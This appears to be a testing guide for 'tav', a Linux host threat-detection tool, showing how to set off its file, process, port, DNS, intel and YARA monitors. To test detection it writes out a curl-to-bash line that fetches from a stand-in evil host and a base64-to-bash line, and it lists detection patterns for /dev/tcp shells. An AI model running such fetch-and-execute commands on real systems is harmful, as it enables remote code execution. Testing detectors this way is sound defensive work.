# tav — Feature Testing Examples

Tested against a standard Linux VM (Debian/Ubuntu). Assumes `tav` is built and on your `$PATH`.

---

## Setup

```bash
cargo build --release
sudo cp target/release/tav /usr/local/bin/tav

mkdir -p ~/.tav/hashes ~/.tav/rules/yara
cp conf/config.yaml ~/.tav/config.yaml

# Verify config parses cleanly
tav config -c ~/.tav/config.yaml
```

---

## 1. Filesystem — Path Regex Block

The `filesystem.block` list is matched case-insensitively against file paths. The default config includes `badfile.*`.

```bash
tav -v run -c ~/.tav/config.yaml &

touch /tmp/badfile_test.sh

tav audit --monitor filesystem
```

Expected: `filesystem` event, action `quarantine` (per the `strict` policy), file moved to `~/.tav/quarantine/`.

---

## 2. Filesystem — Script Content Analysis

The `filesystem.scripts` section scans writable script files for dangerous patterns.

```bash
# Triggers the curl_pipe_shell pattern (severity: high)
cat > /tmp/deploy.sh << 'EOF'
#!/bin/bash
curl http://evil.example.com/setup.sh | bash
EOF

# Triggers the base64_exec pattern (severity: critical)
cat > /tmp/run.sh << 'EOF'
echo "aGVsbG8=" | base64 -d | bash
EOF

tav audit --monitor filesystem --severity high
```

Expected: `filesystem/script` events for `curl_pipe_shell` and `base64_exec`.

Additional patterns in the default config:

| Pattern name | Regex | Severity |
|---|---|---|
| `curl_pipe_shell` | `curl … \| bash` | high |
| `base64_exec` | `base64 -d … \| bash/sh/python` | critical |
| `dev_tcp_shell` | `/dev/tcp/` | critical |
| `eval_chain` | `eval(…)` | high |

---

## 3. Filesystem — Hash Blocklist

```bash
# Create a file and record its SHA-256 in the blocklist
echo "this is malware" > /tmp/testmalware.bin
sha256sum /tmp/testmalware.bin | awk '{print $1}' >> ~/.tav/hashes/blocklist.txt

# Drop a copy — tav catches it on write
cp /tmp/testmalware.bin /tmp/testmalware2.bin

tav audit --monitor filesystem
```

Config required:
```yaml
hashes:
  enabled: true
  block_list: ~/.tav/hashes/blocklist.txt
```

Expected: `filesystem/hash` event for the matching SHA-256.

---

## 4. Process Monitor — Block + Kill

The `processes.block` list is matched against process name and cmdline. Default config blocks `killthisproc`.

```bash
cp /bin/sleep /tmp/killthisproc
chmod +x /tmp/killthisproc
/tmp/killthisproc 60 &

tav audit --monitor processes
```

Expected: `processes` event, action `kill` (per the `kill_alert` policy). The process is SIGKILLed.

---

## 5. Process Monitor — Per-User Prohibit

The `prohibit` map kills specific binaries when run by a named user, regardless of what the process is called.

```yaml
# Add to ~/.tav/config.yaml under processes:
prohibit:
  testuser:
    - /bin/bash
```

```bash
su -c "bash -c 'sleep 30'" testuser &
tav audit --monitor processes
```

Expected: `processes` event; the `bash` process owned by `testuser` is killed.

---

## 6. Process Monitor — Watch Only

`processes.watch` logs matching processes without taking any action.

```bash
# Default config watches "sketchy_tool"
cp /bin/sleep /tmp/sketchy_tool
/tmp/sketchy_tool 60 &

tav audit --monitor processes
ps aux | grep sketchy_tool   # still running — watch_only, not killed
```

---

## 7. Port Monitor — Unexpected Listener

`ports.expected_listeners` defines which listening ports are normal. Anything else triggers an alert.

```bash
# Default expected: [22, 80, 443]
python3 -m http.server 8888 &

tav audit --monitor network/ports
```

Expected: alert for port 8888.

---

## 8. Port Monitor — Process Rule

`process_rules` alerts when a named process opens a socket of a specific type.

```bash
# Default config: nc → any_listen
nc -lp 9999 &

tav audit --monitor network/ports
```

Expected: alert because `nc` opened a listening socket, regardless of which port.

---

## 9. Port Monitor — Blocked CIDR Destination

```yaml
# In config:
ports:
  block_destinations:
    - 192.168.69.0/24
```

```bash
nc 192.168.69.1 80 &
tav audit --monitor network/ports
```

Expected: outbound connection to `192.168.69.x` flagged.

---

## 10. DNS Monitor — Suspicious /etc/hosts Entry

The passive DNS monitor watches `/etc/hosts` for new entries matching configured patterns.

```yaml
# Enable in config:
dns:
  enabled: true
  mode: passive
  policy: notify_only
```

```bash
# DGA-like hostname (20+ random chars before TLD — matches built-in pattern)
echo "1.2.3.4  xq7kzm9wr4tbnolpvfdc3215.com" | sudo tee -a /etc/hosts

tav audit --monitor network/dns
```

Expected: `network/dns` event with severity `medium` (DGA pattern).

To test the `.onion` pattern:
```bash
echo "127.0.0.1  somehiddenservice.onion" | sudo tee -a /etc/hosts
```

---

## 11. Intel — Manual Indicators

```bash
tav intel add hash   d41d8cd98f00b204e9800998ecf8427e
tav intel add domain evil-c2-domain.net
tav intel add ip     185.220.101.1

tav intel status
```

---

## 12. Intel — Feed Update

Pulls all enabled feeds from config (Feodo Tracker IPs, StevenBlack domains, URLhaus domains by default).

```bash
tav intel update -c ~/.tav/config.yaml
tav intel status   # shows row counts per feed + last updated
```

---

## 13. Intel — Bulk Import

```bash
cat > /tmp/bad_domains.txt << 'EOF'
# Known C2 domains
malware-c2.example.net
phishing.bad-actor.org
EOF

tav intel import --type domain /tmp/bad_domains.txt
tav intel status
```

Supported types: `domain`, `ip`, `hash`.

---

## 14. Daemon Mode

```bash
tav daemon start -c ~/.tav/config.yaml
tav daemon status    # PID + uptime

# Trigger an event
touch /tmp/badfile_daemon_test.txt
tav audit -n 5

# Hot-reload config without restarting
tav daemon reload
# Equivalent: kill -HUP $(cat ~/.tav/tav.pid)

tav daemon stop
```

Files written while running as daemon:

| Path | Contents |
|---|---|
| `~/.tav/tav.pid` | daemon PID |
| `~/.tav/tav.sock` | IPC Unix socket |
| `~/.tav/tav-daemon.log` | stdout/stderr |

---

## 15. Output — JSON to stdout

```yaml
# In config:
output:
  json_stdout: true
```

```bash
tav run -c ~/.tav/config.yaml | jq 'select(.severity == "high")'
```

Pipe to any tool that reads NDJSON — `jq`, `grep`, `vector`, etc.

---

## 16. Output — Syslog

```yaml
output:
  syslog: true
```

```bash
tav run -c ~/.tav/config.yaml &
touch /tmp/badfile_syslog
journalctl -f -t tav
# or: tail -f /var/log/syslog | grep tav
```

---

## 17. Output — Webhook

```yaml
output:
  webhook: http://localhost:8080
```

```bash
# Stand up a listener to inspect POST bodies
python3 -c "
import http.server, json
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers['Content-Length'])
        print(json.dumps(json.loads(self.rfile.read(n)), indent=2))
        self.send_response(200); self.end_headers()
    def log_message(self, *a): pass
http.server.HTTPServer(('', 8080), H).serve_forever()
" &

tav run -c ~/.tav/config.yaml &
touch /tmp/badfile_webhook
```

---

## 18. Audit Command — Filter Options

```bash
tav audit                              # last 50 events (default)
tav audit -n 10                        # last 10 events
tav audit --monitor filesystem         # only filesystem events
tav audit --monitor network/ports      # only port events
tav audit --severity high              # high and critical only
tav audit --since 2026-05-15           # events from a specific date
tav audit --monitor filesystem --severity high -n 5   # combined
```

---

## 19. Quarantine — List and Restore

```bash
tav quarantine list

# Copy the ID from the list output
tav quarantine restore <ID>
```

Quarantined files are stored in `~/.tav/quarantine/` with their original path in metadata.

---

## Optional Features

These require specific build flags and system libraries.

### YARA Scanning (`--features yara`)

```bash
apt install libyara-dev
cargo build --release --features yara

# Place rules in the configured dir
cat > ~/.tav/rules/yara/test.yar << 'EOF'
rule SuspiciousString {
    strings:
        $a = "this is malware"
    condition:
        $a
}
EOF
```

```yaml
# In config:
yara:
  enabled: true
  rules_dir: ~/.tav/rules/yara
```

```bash
echo "this is malware" > /tmp/yara_test.bin
tav audit --monitor filesystem
```

Expected: `filesystem/yara` event for `SuspiciousString`.

---

### Live PCAP (`--features pcap`)

Requires root and `libpcap`.

```bash
apt install libpcap-dev
cargo build --release --features pcap
```

```yaml
# In config:
pcap:
  enabled: true
  interface: eth0
  detectors:
    dns_queries: true
    http_hosts:  true
    tls_sni:     true
```

```bash
sudo tav run -c ~/.tav/config.yaml &

# Trigger a DNS query for a blocked domain
# (add one first: tav intel add domain evil.example.com)
curl http://evil.example.com/ 2>/dev/null || true

tav audit --monitor network/pcap
```

---

### TUI Dashboard (`--features tui`)

```bash
cargo build --release --features tui

tav daemon start -c ~/.tav/config.yaml
tav watch   # live three-panel dashboard; press q or Esc to exit
```

---

## Config Option Quick Reference

| Option | Effect | Test value |
|---|---|---|
| `global.dedup_secs` | Suppress repeated events for same subject | Set to `0` to see every event |
| `global.audit_log` | Path to the append-only event log | Change to `/tmp/tav-test.jsonl` |
| `policies.strict` | Actions for strict policy | Try `[alert]` to skip quarantine |
| `filesystem.scripts.max_size_mb` | Skip large files in script scan | Set to `1` |
| `processes.poll_ms` | How often to scan the process table | `100` for faster detection |
| `ports.poll_ms` | How often to scan listening sockets | `1000` for faster detection |
| `intel.auto_update` | Pull feeds on startup if stale | Set to `false` for offline testing |
| `output.json_stdout` | Emit NDJSON events to stdout | `true` to pipe to `jq` |

---

## Event Format Reference

Every detection produces a `ThreatEvent` in `~/.tav/audit.jsonl`:

```json
{
  "id": "3fa4e1b2-...",
  "timestamp": "2026-05-15T14:23:01Z",
  "monitor": "filesystem/script",
  "severity": "high",
  "subject": {
    "type": "file",
    "path": "/tmp/deploy.sh",
    "hash": null
  },
  "matched_rule": "curl_pipe_shell",
  "action_taken": "quarantine"
}
```

Monitor names for `tav audit --monitor <name>`:

| Monitor name | Source |
|---|---|
| `filesystem` | Path regex match |
| `filesystem/hash` | SHA-256 blocklist hit |
| `filesystem/script` | Script content pattern match |
| `filesystem/yara` | YARA rule match |
| `processes` | Process name/cmdline match |
| `network/ports` | Unexpected listener or blocked destination |
| `network/dns` | Suspicious `/etc/hosts` entry |
| `network/pcap/dns` | DNS query for blocked domain |
| `network/pcap/tls` | TLS SNI for blocked domain |
| `network/pcap/http` | HTTP Host for blocked domain |
| `network/pcap/beacon` | Beaconing pattern detected |
| `network/pcap/portscan` | Port scan detected |
